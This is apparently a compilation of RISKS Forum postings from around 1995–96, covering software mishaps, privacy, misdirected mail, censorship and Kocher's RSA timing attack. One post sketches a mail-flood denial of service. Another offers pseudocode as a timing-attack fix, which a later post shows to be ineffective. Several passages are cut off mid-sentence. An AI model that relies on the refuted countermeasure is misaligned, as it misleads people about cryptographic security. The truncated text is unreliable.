BS 4778: ``Quality Vocabulary'', Part 3: {\em Availability, reliability
and maintainability terms\/}, Section 3.1: ``Guide to concepts and related
definitions'', British Standards Institution, 1991.
<P>
IEC 50(191): ``International electrotechnical vocabulary'', Chapter 191:
{\em Dependability and quality of service\/}. This has been dual-numbered
as Section 3.2 of the British national standard:--
<P>
BS 4778: ``Quality Vocabulary'', Part 3: {\em Availability, reliability
and maintainability terms\/}, Section 3.2: ``Glossary of international
terms'', British Standards Institution, 1991.
<P>
The extract also fails to mention:-
<P>
ISO~8402 : 1986, {\em Quality - Vocabulary\/}
<P>
ISO/IEC~9126: 1991(E) ``Information technology -- Software product
evaluation -- Quality characteristics and guidelines for their use'',
first edition, 1991-12-15
<P>
These omissions are somewhat surprising, given that IEC/TC56 is the
technical committee (TC) of the International Electrotechnical Commission
(IEC) working on "dependability" (i.e., reliability, availability,
maintainability and similar concepts, excluding "safety" which is the
responsibility of TC65), and that both it and ISO/IEC JTC1 (Joint Technical
Committee 1, whose subcommittee SC7 is responsible for 9126) are currently
very active.
<P>
This makes me suspect that, despite its June 1995 publication date, M.J.P.
van der Meulen's book is grossly out of date in several important respects.
<P>
As Principal UK Expert (PUKE - Gentlemen, I kid you not! :-) on "definitions
of terms", representing BSI committee DS/1 on IEC/TC56/SC1, I have been
working in this area for several years. (The main qualification is the
ability to sit through a three-hour argument about the difference between a
"functional unit" and an "item" without committing hara-kiri! :-)
<P>
You might be interested to know that, following the receipt of DD198 from
its public comment phase, BSI DS/1/-/1 (Why the "-"? Just DON'T ask!)  is
now working on turning it into a fully issued Part 8 "Assessment of
Reliability of Systems Containing Software" of BS5760 "Reliability of
Systems, Equipment and Components".

original message talked not about emergencies but rather about procedures to
manage risk on ordinary flights.
<P>
The two procedures I thought well-chosen were (a) picking a closer
`destination' to allow for 10% slop in fuel estimation and (b) requiring
independent confirmation before changing the official destination to match
the real one.

After reading the various comments, I still think they are evidence of
well-considered risk management.

<P>
This year ('95) I think I've written a total of 3 memos.  You know, those
official things you resort to when e-mail won't suffice.  It is for that reason
I don't enjoy writing them.  They're an extreme measure and have to be very
carefully worded.
<P>
Uhh .. huh .. so far, so good.
<P>
My last two were no different.  They were addressed to the same audience (my
boss, the HOD, the academic enrollment officer and various people in the
administrative group that `controls' the database - another department,
including the director of that group).  The subject, by the way, was
regarding access to student enrolment data for use in accounts creation.  A
rather serious issue.  The last memo was sent on the 19th of December.
<P>
Today (the 22nd of December, halfway through our Departmental Christmas
breakup, I wandered back into my room, making a final scan of the mess that
was supposed to be my desktop.  In a vain attempt to clean up I shuffled a
few things around, and ended up with a copy of the last poison pen
production in my hand.  An idle scan revealed the first point on the memo to
start [the names have been censored to protect the needle -- pnm]:
<P>
"1.    Mr XXXX's approach to the ASG early last year regarding data
gondolas was in an expectation ..."
<P>
I cracked up.
<P>
Visualisation took over - yup that made sense.  I could see it now.  Extra
large data packets are now to be termed as gondolas.
<P>
How could anyone take this memo seriously?  I shared my gaffe with a few
in the Staff Room (still enjoying the festivities) - including my boss, and
had them crying.  My boss hadn't noticed it either.
<P>
So what had happened?  You guessed it, a spelling checker was used.  I had
used FrameMaker to compose the memo.  I obviously got lazy when it was time
to check the spelling and didn't notice what was being suggested as a
correction (you know - hit the return key... just get on with it!).  All I
can assume is that the intended word was supposed to be _downloads_, and my
fingers got out of synch with my brain, perhaps typing something like
downdolas, I'm not exactly sure ...
<P>
There's a risk where corrections to transposition errors cause an even
greater error, whereas if the error was left intact, it may have been
understood [mabye! :-)]. [And PGN had fun checking mispelings on this issue.]
<P>
Such errors arise from what I term keyboard race conditions.  Common
typos are 'teh' instead of 'the'.  I also have a dread of typing 'interested'
as there's a 20% chance (I'm sure) of it ending up as 'inetereseted'.
<P>
I've never suffered these race conditions when writing (by hand).
<P>
A Merry Christmas and a preprosperous (..) New Year to you all.

<P>
This is a relatively pedestrian RISK for any one who's had experience
configuring e-mail lists, but it's notable, perhaps, because of the
stature of the problem's source...
<P>
Texas Instruments recently opened a Web site they're calling TI&amp;ME, to
provide all sorts of technical info on their products, including data sheets
on their complete lines of analog and digital ICs (this is a lot of data...
the TI data books in my library take almost 10 linear feet of shelf space...
so such a resource could be quite useful to hardware designers).
<P>
In an effort to qualify access to this site they initially required that, at
sign-up time time, you select a login and password, and then wait while a
validation code was separately e-mailed to you. You then had to log back into
their Web site and enter the validation code before you could get access to
the data sheets.
<P>
While a bit awkward, this process seemed to work OK... Last night, however,
I got e-mail from their service announcing that they had removed the
validation code requirement from their sign-up procedure...  fine by me... I
was already in...
<P>
Unfortunately, whatever change they made in their system also seems to have
triggered an avalanche of bogus e-mail to people on their list...  this
morning I logged in to find dozens of bounced mail replys, replys to bounced
mail replys, replys to replys of bounced mail, etc... all originating from
TI's site... and I'm hoping they fix it soon...
<P>
What's the RISK lesson? I suppose it's best summed up by something Mitch
Ratcliffe said a while back: "Computers let you make more mistakes faster
than anything except handguns and tequila..."

<P>
I am interviewing job applicants at the moment.  I saw the mention of the
alta vista search engine in Risks and thought it could be a useful tool for
gathering extra information about applicants from their usenet
participation.  I am dubious about the morality of this course of action but
I am also keen to recruit the best person for the job.
<P>
Anyway, to cut a long story short, I didn't get any hits on any of the
applicants.  So I tried searching for myself......and the first hit was an
obscene mailing to one of the alt newsgroups.
<P>
I have an unusual name so any prospective employer might very well assume
that the obscene poster was me.
<P>
In a way I think that this experience was amusing in an ironic way.  I tried
to use underhand means to discover things about job applicants and, instead,
found out that my name's net image isn't quite as expected.

It's natural to assume that a person actually reads all the newsgroups they
post to; however, this is not always the case.  Followups to a crossposted
article in most cases go to all of the original newsgroups, which is usually
not a serious issue; however, some posters make a nasty hobby of
crossposting "trolls" to totally unrelated newsgroups, often including
groups on pretty damning topics, in the eyes, for instance, of potential
employers.  For a case in point do a search on Alta Vista
&lt;<A HREF="http://www.altavista.digital.com/">http://www.altavista.digital.com/</A>&gt; for:<BR>
<P>
drugs.pot and <A HREF="mailto:haz1@midway.uchicago.edu">haz1@midway.uchicago.edu</A>
<P>
Now, look at the actual content of the posts this search turns up...  :-)
<P>
The RISK?  If you aren't careful about following up to someone else's post,
you could be listed in search engines across the net as a regular poster to
newsgroups you don't actually read-- and there's no guarantee that potential
clients or employers will think to double-check the content of those posts.

<P>
Some pc motherboards now (or soon will) have flash RAM chips placed
where the old bios rom chips used to live.  So after production, the
bios code is loaded into the flash RAM.  The benefits are shorter time
to market (the bios doesn't have to be finished until the last minute)
and upgrades will also be possible in the field.
<P>
The RISK here is from code that would write to the flash RAM,
ie. altering the operation of the bios (viruses), or maybe deleting
random segments of it.
<P>
Each PC will have to come supplied with a re-load trusted bios program,
but I have no idea how (or if) this would work.
<P>
Another RISK is that the flash RAM will probably only be good for tens of
program cycles (updates) to keep costs down.  After a few virus attacks and
reloading the bios and legitimately updating it, writes to the RAM chips may
start to fail and the whole pc will be useless.

(update to yesterday's note/today's posting)
<P>
Well, my No! Stop! Don't do it! e-mail to the hostmaster at the InterNIC did
not stop the erroneous DNS update from taking place. [I sent in a request to
update a domain i own XXXXs.net and made a typo of XXXX.net (no "s").]
<P>
The "system" is supposed to allow updates only from the "owner", technical
contact, or admin contact of a domain. Obviously, there is a "improvement
opportunity" in the current system, as I just checked and the erroneous
update occurred this morning, despite my not being associated with the other
domain in any way and sending a note to the NIC telling them NOT to make the
update....
<P>
[Date: Fri, 22 Dec 1995 14:57:02 -0800 received time]
<P>
I just got a reply acknowledging my "NO! Don't do it!" note which I
sent to the InterNIC after receiving their confirmation of my (typoed)
request to update my domain nameserver XXXXs.net
<P>
The note says that the _correct_ update has now been performed and
will be available on Monday - what a Christmas present for the folks
in the other domain.
<P>
Checking with the NICs whois service today, I see the (incorrect)
data is available, earlier than promised (5 PM today). ]

<P>
&gt; it is possible to format write-protected disks when using the German<BR>

<P>
Sorry, but either they are wrong or the report was incomplete.  Win95
mostly, and to the best of my knowledge only, runs on BIOS/Intel/DOS
compatible machines.  Almost without exception, these computers use disk
drives where the write protection circuitry is built into the hardware.
(Believe me, we have discussed this times without number in the virus
discussion area.)
<P>
It is possible for the circuitry to fail.  Also, 3.5 inch drives fail
"writeable" while 5.25 inch drives fail "safe".  And there are interesting
problems with transparent or silvered tabs or disks.  Macs generally have
the same type of hardware write protection, although I believe there was
discussion of bypassable write protection on some obsolete models.

I have not read that article yet.  However, I wish to improve on the
translation of the two terms given in German:
<P>
&gt; Such a practical ["praktisches"!] information system is needed by the<BR>
<P>
In this context, "praktisch" usually means both "useful", and "easy-to-use".
Hence, the preceding sentence means: Such a handy information system is
needed by the German government and secret services.  (A rather cynical
remark, typical for the "Bulkware" column that does not mince matters.)
<P>
&gt; This database must be organised so that it can be accessed by higher<BR>
&gt; places ["hoeheren Orts"!] without the telecommunication provider noticing<BR>
<P>
"Hoeheren Orts" is an almost obsolete term, from Prussian and the Kaiser's
times, meaning "by the authorities", or "by the powers that be"; this term
was often used to indicate personal involvement of the emperor. ("Man war
hoeheren Ortes nicht erfreut" == "His Majesty was not amused".)  Again,
Bulkware hints at an attempt to reinstate features of an authoritarian
state that supposedly had been overcome.

In correcting/debunking this story the moderator has managed to introduce a
new error.  He talks about the improbability of a teenaged Navy captain;
while the original story said an Air Force captain.  "Captain" has a very
different meaning between the two services.  Air Force captains, while not
teenagers, tend to be many years younger than Navy captains.  Navy captain
&lt;~=&gt; Air Force colonel; Air Force captain &lt;~=&gt; Navy lieutenant.  (where ~=
means "approximately equal")

&gt;If he was a Navy captain, he could not have been all that young.  Whizzkids<BR>
&gt;are usually considered teenagers.  Anyone know of any teenaged Navy captains?<BR>
<P>
Minor point - the guy was supposed to be an Air Force captain (third officer
rank), not a Navy captain (6th officer rank).  A U.S. Air Force captain
could be as young as 25 or so, which could be considered whizzkid-esque from
an upper-echelon (i.e. Navy captain, early to mid forties) perspective.
<P>
To make things more confusing, the Navy equivalent of an AF captain is a
lieutenant, and the Navy equivalent of a AF lieutenant is an ensign.
Convoluting matters further, in the Canadian and British militaries,
lieutenant is pronounced 'lef-tenant' yet spelled the same.  And the AF
equivalent of a captain is a colonel, which is also not pronounced as it
sounds because of a horrific entomological journey from Italian via French
to English.
<P>
A 2nd Lieutenant wears a gold bar, yet a 1st lieutenant wears a silver bar.
And even though a major outranks a lieutenant, a lieutenant general (3
stars) outranks a major general (2 stars).
<P>
Ranks make much sense sometimes.  The RISK - not using unique keys for
different military service's ranks. :)

In RISKS 17.57, Gary M. Watson tells of receiving someone else's
checking statement, and writes:
<P>
&gt; 2. Don't put all sorts of important numbers on check Memos.<BR>
<P>
Unfortunately, this won't help.  Take a look at the back of your cancelled
checks sometime.  When you make a payment to any moderately large company,
the first thing they do is print important audit-trail information on the
back: the date, the amount of the payment, and the account number credited
are always included, among other things.  They need this in case a problem
arises.  So a moderately knowledgeable thief can extract the critical
numbers regardless of whether you put the account number in the memo line.
(The only time the "please put account number on check" advice is actually
useful is when your check gets separated from the bill stub before it can
get into the processing machine, which one hopes is a rare occurrence.  I
ignore the advice out of laziness, not for security purposes.)

Did you hear about the problem that occurred when a leap second was added at
midnight on New Year's Eve. Apparently, because of a mistake somewhere along
the line, the leap second was added but the date was also inadvertently
advanced to Jan. 2. I heard from a source at AP radio that the
synchronization of their broadcast networks depends on the official time
signal, and this glitch affected their operations for several hours until
the problem was corrected.
<P>
You can't even count on the national timekeepers to get it right all the
time! And the year 2000 is coming up fast.

<P>
The Cobb Group publishes INSIDE MICROSOFT OFFICE, a monthly newsletter for
users of Microsoft office products.  In their January 1996 issue, they
address a problem already discussed at some length in the Risks Forum ---
floating point expressions in spreadsheets like Excel 5.0 that do not
evaluate properly.  They say the problem isn't an Excel bug, it's a
consequence of the IEEE floating point standard 754.  Many numbers with
exact decimal representations do not have exact binary representations;
arithmetic operations on the binary approximations may not give the same
results as the same operations on the decimal numbers.  They suggest a
"workaround" -- wrap your floating point expressions in the ROUND() function
-- e.g., ROUND(0.3-0.2-0.1,5) will yield 0 rather than -2.8E-17.
<P>
This analysis, while helpful to spreadsheet users worried about the accuracy
of calculations, is somewhat misleading.  The IEEE 754 standard is an
innocent bystander because the real problem, finite binary representations
of decimal numbers, will happen with ANY binary floating point standard.
The ROUND() function does not eliminate the problem, it only masks it behind
a larger approximation error at the decimal level.
<P>
Modern spreadsheets are so powerful that any user can set up numerically
intensive computations and invoke all the problems that specialists have
spent years to learn to avoid.  For example, if you are doing a capacity
study of a client-server system, you are likely to want to solve balance
equations of the form x=Ax, where x is a vector of unknown numbers and A is
a matrix.  It is easy to set this up on a spreadsheet and utterly amazing
how difficult it is to get the spreadsheet's iterative calculation algorithm
to converge to a meaningful answer.  This one can't be helped by the ROUND

offer numerical libraries that contain numerically stable algorithms for
various problems, and urge users to select those packages rather than
attempt their own, homegrown solutions.

I tried to finger someone at Carnegie Mellon University, and got the following
reply:
<P>
[cs.cmu.edu]<BR>
finger: No names match "jwebb" , 1 nearest match is:<BR>
Hooman Yaghoobi (hooman)
<P>
This was not done on April 1st, and I don't think that I connected to the
Monty Python server by mistake.
<P>
I was quite impressed that the finger program considered this a 'match' at
all, and am at a total loss as to what metric it could possibly be using.
CMU CS department has a large number of people in it, so the chances of
getting this match instead of some other would normally seem to be quite
remote.
<P>
(BTW, Jon Bentley did his thesis on best matches using a Euclidean metric at
CMU if I recall correctly, although I doubt that CMU 'finger' is using his
algorithm. :-)

<P>
Peter Neumann's book "Computer-Related Risks" discusses some examples of
problems with reproducibility and validation of computer simulations used to
assess the safety of nuclear power plans.  A story ("Maine reactor probe
widens") in *The Boston Globe*, 23 Dec 1995, p. 17, adds some new twists.
The story uses the phrase "it became clear that Maine Yankee had made
widespread use of an allegedly inaccurate computer code to simulate
accidents."  The story gives me the impression that the charges are credible
enough to have spurred action by the NRC.  They are attributed to an
anonymous whistleblower writing to Robert Pollard of the Union of Concerned
Scientists, an organization to which I donate which can be vaguely
characterized as "antinuclear."
<P>
The whistleblower alleges that "in 1983, Maine Yankee officials developed a
computer code that help predict the plant's emergency core cooling systems
would be `grossly inadequate' in the vent of a pipe break.  Maine Yankee
`refused to even discuss the possibility' of upgrading the emergency safety
system, and did not report the results.  Instead... plant officials
repeatedly modified the computer code over the next four years, but each
`reasonable' computer-simulated accident had the same result: the fuel got
too hot to meet NRC standards... finally in May 1989, Maine Yankee told the
NRC that their new computer code, known as RELAP5YA, showed the plant could
withstand a pipe break without a serious accident...  Pollard said the NRC's
[resulting] approval looks particularly bad because the agency had evidence<BR>
in 1989 that RELAP5YA was not a reliable computer code."
<P>
The RISK here is the popular presumption that anything that comes out of
a computer is authoritative and objective, which made it easier for Maine
Yankee, with the complicity of a lenient NRC official, to evade the
purpose of the regulations requiring computer simulation.  In addition, it
appears from the story that Maine Yankee was in effect able to stall the
NRC for at least five years by "claiming they were still working on the
more sophisticated computer projection." When regulations are tied
to the completion of a computer-related project it may be hard for
officials to enforce deadlines because they recognize that big software
projects are never completed on time.

Last Friday (December 30,1995), a Bavarian State Attorney sent police to
Germany's CompuServe offices to close down any German access to the Internet
via CompuServe for services offering child pornography. The legal
prosecution was based on paragraphs forbidding distribution of child
pornography. As CompuServe felt (technically?) unable to close such access
exclusively for its (about 200,000) German customers, they decided to close
such services IN GENERAL, also affecting its 3,800,000 customers world-wide.
No other German provider of Internet access (e.g. T-Online, a service of
German Telekom) were NOT prosecuted (their headquarter is NOT in Munich).
<P>
Following discussions in diverse newsmedia suffered from evidently missing
knowledge about Internet in general and issues of responsibility of service
providers. Though such aspects were internationally broadly discussed
recently (e.g. the difference between responsibilities of a moderated group
versus unmoderated ones), Bavarian police seemed rather unaware about such
intricacies.
<P>
Apart from the risk of living in a country with censorship-friendly
bureaucrats, a UNIVERSAL RISK derives from the fact that NATIONAL LAW is
applied in a way to influence the UNIVERSE. As countries with different
cultural values and legal principles handle "freedom of information" (FOI)
aspects differently, laws of countries with strongest restrictions in FOI
may dominate more liberal ones :-). This may also apply to Germany itself,
being a federal state with hardliners (such as Bavaria, which even did not
sign the Federal Constitution 50 years ago :-) and more liberal countries
(esp. those where some national service providers reside :-) Moreover, some
lawyers doubt that the ancient paragraphs concerned with distribution of
child pornography may apply to electronic distribution.

<P>
Cyberspace wiretap leads to arrests<BR>
UPI Northeastern US  29/12/95 14:46
<P>
By TRACEY L. MILLER
&gt;    NEW YORK, Dec. 29 (UPI) -- The G-men have started bugging cyberspace.
&gt;   The U.S. Secret Service announced Friday that a court-sanctioned
&gt; wiretap on the Internet has led to the arrests of three people who
&gt; allegedly advertised the sale of illegal electronic surveillance devices
&gt; through the on-line service, CompuServe.
&gt;   "These arrests offer a glimpse into what crime and law enforcement
&gt; will look like in the 21st century," Brooklyn U.S. Attorney Zachary
&gt; Carter said at a Manhattan news conference. "Criminals are adjusting to
&gt; new means of communications in the same way we are."
<UL>
<LI>Bernard Bowitz a German national, his estranged wife, Rachel, and Gregory
Brooks of Seattle were arrested.
<P>
<LI>Seizures included a cellular phone cloning equipment: a "Lifetime Phone"
capable of storing 99 stolen Mobile Identification Numbers (MIN) and
Electronic Serial Number (ESN) combinations; a "Celltracker" that also
allows the caller to eavesdrop on any nearby cellular conversation, and an
"ESN Reader", which allows the user to steal the MIN/ESN combinations. Also
seized laptop computers, scanners, covert transmitters and receivers
hundreds of cellular phones and a satellite cellphone. Some covert
transmitters were disguised as a three-pronged wall socket and a fountain
pen.
<P>
<LI>AT&amp;T Wireless Services Security noticed Bowitz's ads on CompuServe.  They
verified what he was offering and tipped the US Secret Service (USSS) and
the Drug Enforcement Agency (DEA).  Bowitz also advertised openly on a World
Wide Web site.
<P>
&gt;    The Department of Justice and the U.S. district court gave
&gt; investigators authorization to monitor the trio's outgoing and incoming
&gt; CompuServe E-mail messages, the first time permission for such a wiretap
&gt; over the Internet has ever been granted.
&gt;   "This authorization was critical, since Bernhard and Rachel Bowitz,
&gt; and Gregory Brooks, perhaps believing that Internet communications were
&gt; immune from interception, spoke relatively openly in their E-mail
&gt; communications," said Brian Gimlett, who heads the Secret Service's New
&gt; York Field Office.
<P>
<LI>Operation has been ongoing for several months and ran from New York City
to Seattle, Las Vegas and Hong Kong.
<P>
<LI>Bowitz communicated with an undercover DEA agent by e-mail and met him
several times for buys.  Bowitz also was laundering US$225K believed to have
come from drug trafficking.
<P>
&gt;   "The significance of this case should not be minimized," said
&gt; Gimlett. "This case has substantially impeded the spread of technology
&gt; that would undercut law enforcement's ability to conduct effective
&gt; electronic surveillance, endanger the telecommunications and
&gt; international business community and intrude upon the public's right to
&gt; privacy."
<P>
<LI>All three charged with wire fraud, the manufacture and sale of illegal
intercepting devices, and conspiracy. Bernhard Bowitz, alone, was charged
with money laundering.  Bowitz is in the grey-bar hotel pending US$500K
bail. His wife is out and about on bond in Las Vegas.  Brooks was arrested
in New York and is free pending his arraignment next month.
<P>
<LI>Joint investigation included AT&amp;T and the New York Electronic Crime Task
Force.  The task force includes USSS, DEA and the New York Police
Department.
<P>
&gt;    "The Internet has become the new battleground for law
&gt; enforcement to fight crime," said Gimlett.

<P>
While not life-threatening, this situation is definitely sanity-threatening
when one is in a hurry.
<P>
I recently had to go to a local Star Market grocery store to purchase
chicken stock.  It turned out that the store was having a sale on chicken
stock that day.  Normally you might expect this would be a good thing from
my point of view, but it added more than 5 minutes to my wait in the express
checkout lane.  Here's why:
<P>
As with most large supermarkets, Star has UPC scanners connected to price
databases to speed checkout.  They also print weekly circulars with coupons.
They recently started a program called Star Advantage which uses a scannable
card instead of coupons.  You present the card to the cashier, and when the
bill is totalled the system automatically applies any of the weekly coupons
for items you bought.
<P>
[You're encouraged to present your card for all purchases, because you don't<BR>
always know if something has a coupon or not.  The subject of the store
building up a database of what you buy, when, and how you pay for it is a
privacy RISK for a separate article.]
<P>
The checkout procedure has provisions for buying a large quantity of items
at once.  People often buy a case of something on sale, the cashier scans
one item followed by "quantity 36" for example.  People purchasing one or
two cases of something often go through the express lane because the
checkout is as fast as buying one or two single items.
<P>
Coupons must always be entered and printed one at a time, however.  Herein
lies the problem.  The two people ahead of me in the line both purchased two
cases of the chicken stock, and both used Star Advantage cards.  It took
only a few seconds to scan one can of stock and hit quantity 72.  When the
purchase is totalled, the computer applies 72 coupons to the sale.  But the
software knows it has to print all the coupons individually, so it starts
cranking out 72 or 144 lines (coupons might require two lines) on the
receipt.  The register printers are fast enough to keep up with items being
scanned individually.  But at a second or so per line of text, it's a long
wait for the cashier, the customer, and everyone in line when it's printing
the coupon information.
<P>
This is an example of adding a feature without thinking through how it will
be used.  In the past, no one would pick up 36 circulars and tear out 36
coupons.  Or if they did, they wouldn't consider going through the express
line like that.
<P>
Using systems for something other than what they were originally designed
for is one of the stock RISKs we see here.  What seemed like an idea that
would help customers could end up leaving a fowl taste in their mouths if
they wait too long in the express lane.  I'm almost chicken to submit this
for fear of seeing what commentary PGN will add to this "Case of the Delayed
Customer."

<P>
At home I have a Unix workstation which I connect to the Internet using PPP
from a service provider that gives me a dynamically assigned IP address.
Yesterday when I connected I noticed that I was getting large amounts of
incoming data over my low-bandwidth phone connection. I couldn't do anything
through the connection.
<P>
After checking some log files, I found out that my machine was receiving
dozens of mail messages. All of the messages were addressed for a machine
called XXXXX.org [I put X's in place of the real name]. I did a DNS lookup
on this XXXXX.org and found that its IP address was the same as my assigned
address.
<P>
So my home machine was being sent mail messages from mail servers that thought
my machine was XXXXX.org. To make it worse, since my machine knew it wasn't
XXXXX.org, it would pass the mail onto a mail-relay host, but that mail-relay
host would pass the mail right back since it still thought my machine was the
right one.
<P>
Each piece of mail that my machine received for XXXXX.org would be passed back
and forth 18 times, and on a slow phone-line this essentially stopped me from
doing anything else.
<P>
The only thing I could do was drop the connection, reconnect with a new IP,
and send some mail to a few sys admins.
<P>
This problem could have gone unnoticed for a while, since most people
connecting with dynamic IPs are probably not running mail server software,
so their machines would just refuse the connection and the mail would
just stay spooled on the mail servers waiting for a machine that will
accept a mail connection.
<P>
Another problem is that this could be used as a denial of service attack.
You could send large amounts of mail to addresses you know are dynamic,
and the next person to connect could be deluged.
<P>
I think the biggest risk from this is that I was receiving dozens of possibly
private messages intended for someone else. Mistakes in configuring name
servers or assigning IP addresses could cause anyone's mail to be
misdirected.

<P>
NAME
loaddog - system crash detection dead man's switch
<P>
SYNOPSIS
loaddog [-d] [-l loadavg] [-m bytes] [-r retries]
<P>
DESCRIPTION<BR>
loaddog  monitors  system  vital  functions  and  if  they
repeatably fail shuts the system down  (if  possible  with
one minute warning) and reboots. Nearly all possible fail-
ure points within loaddog itself  due  to  serious  system
malfunction  are  handled, from file system unmounting and
syncing requests hanging to loaddog suffering from segmen-
tation  violations.  Currently  the  following  vitals are
tested every 60 seconds:
<P>
system can create new processes<BR>
system can execute new binary images (/bin/date  is
used as the test program)<BR>
system can create new file descriptors<BR>
system can create new tcp sockets<BR>
system load average over the course of the last 15
minutes is within reason<BR>
system is scheduling correctly<BR>
system can allocate new virtual memory
<P>
If running under Linux-1.3.51+ Loaddog also supports  Alan
Cox's  in-kernel  software  deadman's switch /dev/watchdog
which will perform a hard (nasty) reboot should the system
become so unusable that even the Loaddog daemon can't run.
<P>
OPTIONS
-d     Detach from the controlling tty.
<P>
-l loadavg
The highest acceptable 15 minute loadavg.  Defaults
to 10.0.
<P>
-m bytes
The  minimum  acceptable  quantity  of free virtual
memory. Defaults to 2 Mb.
<P>
-r retries
Do not consider the system terminal  until  retries
consecutive  vital failures have occurred. Defaults
to 3 - that  is  three  consecutive  failures  over
three minutes.
<P>

The timing attack presented by Paul C. Kocher in his extended abstract
of the paper "Cryptanalysis of Diffie-Helman, RSA, DSS, and Other
Systems Using Timing Attacks"
(<A HREF="ftp://ftp.cryptography.com/pub/kocher_timing_attack.ps">ftp://ftp.cryptography.com/pub/kocher_timing_attack.ps</A>)
is really worth consideration, however I would like to stress there is no
need for panic, mainly for two reasons:
<OL>
<LI>Security of practical cryptosystems do not rest solely on security of<BR>
crypt algorithm. In fact, cryptoanalysis attacks are rare, due to strong
crypto algorithms that are presently known. More often cryptosystems are
broken using other weak points of cryptosystems as insecurity of keys, bad
key management, easy to guess passwords, computer screen radiation,
monitoring the keystrokes of computer in network, ...  The timing attack can
be considered just as one of them, not the most dangerous one. For practical
cryptosystem, it would be extremely difficult to measure exact timing of
encryption process, at least much more difficult as to monitor keystrokes or
to capture entire message from the screen. The intruder, who would be able
to measure the exact timing of encryption in a multitasking environment,
would probably also have access to everything else (i.e., secret message,
secret key, passwords, ...) and thus no need to measure timing.
<P>
<LI>It is not so difficult to rewrite algorithms to be resistant to timing<BR>
attacks, i.e., to have execution time independent of secret key.  For
example, the algorithm to compute R = y^x mod n given in the Kocher paper
can be simply rewritten as:
<P>
Let R = 1.<BR>
Let A = 1.<BR>
Let z = y.<BR>
For i=0 upto (bits_in_x-1):<BR>
If (bit i of x) is 1 then<BR>
Let A = (R*z) mod n<BR>
Else<BR>
Let B = (R*z) mod n<BR>
Let y = y^2 mod n.<BR>
Let R = A.<BR>
End.

As a junior executive officer in the UK Civil Service (Home Office,

of responding to enquiries from abroad regarding immigration.

Her work consisted of reading each letter, selecting from a set of
trays one of around 50 standard pre-typed replies, clipping the reply
to the letter, and placing it in the out-tray from where it was taken
to be checked by a more senior officer before being signed and posted.

It seems like *exactly* the sort of task that could be computerised,
and would not even require a particularly "expert" system. In fact, any
system with any real intelligence would probably do what my wife did
after three days: crawl up the wall screaming and hand in her notice!

Syndicated columnist Gina Smith predicts a proliferation of computer "spy"
viruses similar to Microsoft Windows 95's registration wizard that can zip
around your CPU and determine whether you've legally registered all the
software you've got loaded on there: "It's already possible to do this sort
of scanning without alerting the user, so it doesn't take much of a futurist
to imagine the same sort of stealth technology being used on unknowing
bulletin board and Internet users.  In fact, I think a trend away from
juvenile-prank computer viruses to information-seeking `spy' viruses isn't
merely likely, it's inevitable."  (Popular Science Dec 95 p12)

The German Telecom, a private telecommunication system with a monopoly in
Germany for 2 more years, has upped considerably the prices for telephone
usage, some say to fill the coffers before the competition wars. Local calls
now cost 12pf for 90 seconds [and you can't say anything interesting in
German under 90 seconds...], calls to Mom and Dad and Aunt Sally are more
expensive except when called between 9pm and 5am, etc. The only time one can
really afford to call is on weekends and holidays.
<P>
The tariffs went into effect on 1 Jan 1996, a holiday [used to sleep off all
that alcohol from the night before]. Lucikly, some suspicious people used
stopwatches at phone boots to clock the units -- and they were being used up
at the rate of 1 unit per 90 seconds, just like a normal Monday. Enraged
customers flooded the Telecom hotlines; one man tried to have the police
take down a report of thievery (they refused); politicians and news
commentators tsk-tsk-ed. The next day the Telecom somewhat red-faced
admitted that they had "forgotten" to program the first of January as a
holiday. They assured that all persons damaged would be compensated - how
they are going to do that when we don't have itemized bills in Germany will
probably be the basis for one of my next RISKS reports from Germany.

<P>
&gt; 1) Security of practical cryptosystems do not rest solely on security of<BR>
&gt; crypt algorithm. [...]
<P>
Using this logic, the fact that there are often be other weaknesses should
make people panic even more.  While there are usually additional ways to
attack a cryptosystem, a weakness in the cryptography will often completely
destroy the system's security.
<P>
The primary reason the attack isn't a cause for panic is that (1) it can be
fixed and (2) there aren't many sophisticated cryptosystems online yet that
use high-value certificates.
<P>
&gt; 2.) It is not so difficult to rewrite algorithms to be resistant to timing<BR>
&gt; attacks, i.e., to have execution time independent of secret key.  For<BR>
&gt; example, the algorithm to compute R = y^x mod n given in the Kocher paper<BR>
&gt; can be simply rewritten as: [program deleted; see <A HREF="/Risks/17.59.html">RISKS-17.59</A>.  PGN]<BR>
&gt; to be resistant to timing attacks.
<P>
This does not work.  As I explain in the abstract, this will not eliminate
the RISK and actually tends to make the problem worse.
<P>
The problem is that doing the multiply regardless of whether the exponent
bit is set does not eliminate the timing variations.  It just pushes the
variation forward until the next iteration of the exponentiation loop.  The
amount of time required for iteration i now depends on exponent bit from
iteration i-1.  This will often help the attacker since zero bits can now be
identified from positive correlations instead of the lack of a correlation.
<P>
There has been a disturbing amount of technically inaccurate talk about the
timing attack.  A quick rule of thumb when trying to figure out how many
samples are required is to assume that the number of measurements is
proportional to:
<P>
(timing_signal_size / measurement_error)^2
<P>
where timing_signal_size is the size of the signal being detected (in the
example above, this would be the standard deviation of the modular
multiplication function) and measurement_error is the standard deviation of
the error being detected (including both measurement errors and errors
induced by the not-yet-attacked portions of the modexp function).  Good
local network connections seem to have a S.D. of about 1ms, while
well-connected Internet sites typically have a S.D. of a few milliseconds.
<P>
As explained in the abstract (<A HREF="http://www.cryptography.com">http://www.cryptography.com</A>)
there are four good solutions to the timing attack RISK:
<OL>
<LI>Don't reuse keys (impractical with certificates)
<LI>Prevent attackers from making timing measurements (i.e.
have a standard deviation of at least several seconds)
<LI>Make modular exponentiation take exactly constant time.
<LI>Blind before the modexp and unblind afterward.
</OL>
Note that (3) is extremely difficult to do on most computers since factors
like system load, system response time, etc. can leak timing information.
Even on cryptographic tokens, details like power consumption can still leak
timing information.  Option (4) is thus the simplest solution.

<P>
I am dismayed by the large number of competent people say that the timing
cryptanalysis attack is not really a problem because "it is easy to rework
the implementation to avoid the attack."
<P>
The fact that implementations CAN be fixed is not the point.  There are many
systems ALREADY DEPLOYED that have this problem.  Those systems are already
at risk.  The fact that it takes an engineer a few hours to develop a
technical solution is irrelevant.  History shows that it takes a long time
to update systems in the field.
<P>
There are good reasons not to get too worried about this kind of attack.  My
point is that "it is easy to fix" is NOT among them.

As I was about to send my message, Bill Bereza &lt;<A HREF="mailto:berezaw@river.it.gvsu.edu">berezaw@river.it.gvsu.edu</A>&gt;
wrote about "Dynamic IP mistakes" to RISKS 17.59:
<P>
&gt;I think the biggest risk from this is that I was receiving dozens of possibly<BR>
&gt;private messages intended for someone else. Mistakes in configuring name<BR>
&gt;servers or assigning IP addresses could cause anyone's mail to be<BR>
&gt;misdirected.
<P>
A similar situation happened to my service provider, not to an individual
